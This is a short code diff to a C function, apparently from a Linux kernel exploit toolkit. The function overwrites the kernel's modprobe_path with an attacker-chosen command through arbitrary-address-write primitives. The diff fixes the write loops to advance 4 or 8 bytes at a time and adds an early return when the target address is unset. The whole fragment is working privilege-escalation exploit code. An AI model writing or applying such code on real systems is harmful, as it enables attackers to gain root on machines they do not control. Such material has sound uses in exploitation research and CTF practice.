@@ -9,15 +9,16 @@ void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, uint32
                              void (*aaw64)(void *, uint64_t)) {
     if (addr_modprobe_path == DUMMY_VALUE + kbase_offset) {
         puts("[-] please set addr_modprobe_path");
+        return;
     }
 
     const uint64_t len = strlen(cmd);
     if (aaw32 != NULL) {
-        for (uint64_t i = 0; i < len; i++) {
+        for (uint64_t i = 0; i < len; i += 4) {
             aaw32((void *)addr_modprobe_path + i, *(uint32_t *)&cmd[i]);
         }
     } else if (aaw64 != NULL) {
-        for (uint64_t i = 0; i < len; i++) {
+        for (uint64_t i = 0; i < len; i += 8) {
             aaw64((void *)addr_modprobe_path + i, *(uint64_t *)&cmd[i]);
         }
     } else {
